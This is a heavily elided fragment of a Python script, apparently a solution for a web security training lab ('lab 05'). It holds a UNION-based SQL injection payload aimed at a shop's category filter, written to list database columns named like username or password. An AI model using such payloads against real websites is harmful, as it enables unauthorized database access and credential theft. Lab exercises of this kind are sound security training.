...
def sql_injection_test(url, use_proxy=False):
    try:
        ...
        payload = "/filter?category=Gifts' UNION SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%username%' OR column_name LIKE '%password%' --"
...
def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 05')
